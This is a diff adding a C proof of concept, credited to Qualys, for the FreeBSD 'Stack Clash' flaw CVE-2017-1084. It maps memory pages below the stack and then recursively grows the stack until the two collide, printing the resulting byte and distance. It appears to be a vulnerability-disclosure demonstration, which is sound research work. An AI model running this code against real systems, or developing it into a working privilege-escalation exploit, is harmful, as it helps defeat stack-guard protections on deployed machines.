@@ -1,0 +1,69 @@
+/*
+ * FreeBSD_CVE-2017-FGPE.c for CVE-2017-1084 (please compile with -O0)
+ * Copyright (C) 2017 Qualys, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
+#include <sys/time.h>
+
+#define die() do { \
+    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
+    exit(EXIT_FAILURE); \
+} while (0)
+
+static const char * last_page;
+
+static void
+alloc(const char * const final)
+{
+    for (;;) {
+        last_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (last_page == MAP_FAILED) die();
+        if (last_page >= final) break;
+    }
+}
+
+static void
+clash_smash_no_jump(const size_t smash_size)
+{
+    char buf[1024];
+    memset(buf, 'A', sizeof(buf));
+    if (smash_size > sizeof(buf))
+        clash_smash_no_jump(smash_size - sizeof(buf));
+}
+
+#define SGROWSIZ        ((size_t)128UL*1024)            /* amount to grow stack */
+
+int
+main(void)
+{
+    static const struct rlimit core;
+    if (setrlimit(RLIMIT_CORE, &core)) die();
+
+    struct rlimit stack;
+    if (getrlimit(RLIMIT_STACK, &stack)) die();
+    const size_t smash_size = stack.rlim_cur / 3 * 2;
+    const size_t final_dist = arc4random() % smash_size;
+
+    alloc((const char *)&stack - final_dist);
+    clash_smash_no_jump(smash_size);
+    printf("char at %p: %02x; final dist %zu (%zu)\n", last_page, *last_page, final_dist % SGROWSIZ, final_dist);
+    exit(EXIT_SUCCESS);
+}
